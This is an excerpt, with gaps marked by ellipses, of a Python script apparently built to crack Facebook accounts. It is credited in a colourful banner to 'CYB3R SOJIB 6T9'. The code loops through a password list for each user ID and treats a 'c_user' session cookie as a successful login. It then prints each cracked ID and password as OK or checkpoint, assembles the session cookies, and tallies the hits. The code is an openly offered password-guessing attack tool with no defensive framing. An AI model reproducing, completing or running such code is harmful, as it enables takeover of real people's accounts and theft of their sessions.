...
\033[1;32m[-] AUTHOR    :\033[1;32m CYB3R SOJIB 6T9
\033[1;32m[-] GITHUB    :\033[1;32m SOJIB-CYB3R-6T9
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;96m[\033[1;92m[SOJIB-OK💛]\033[1;96m[❤️]\033[1;92m' +uid+'\033[1;92m●'+ps+'\033[1;94m<=>'+tahunng(uid))
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:156]
                print('\033[1;96m[SOJIB-CP]\033[1;93m[😪]\033[1;96m'+uid+'='+ps+'\033[1;93m<=>'+tahunng(uid))
                print ('\033[1;32m[‎🍁]\033[1;91m = \033[1;34m'+pro+'  \033[0;32m')
                ...
                continue
        sys.stdout.write('\r%s[SOJIB-%s/%s] \033[1;92m[OK-%s][CP-%s]\r'%(bi,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                print ('')
                print('\033[1;93m [\033[1;96mSOJIB-OK💚\033[1;93m]\033[1;91m = \033[1;96m\033[1;92m' +uid+' | '+ps+'\033[1;91m = \033[1;96m '+tahunng(uid))
        ...
        sys.stdout.write('\r%s[SOJIB-KING💥]\033[1;32m-%s/%s][OK-%s]\033[1;92m[CP-%s] \r'%(bi,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
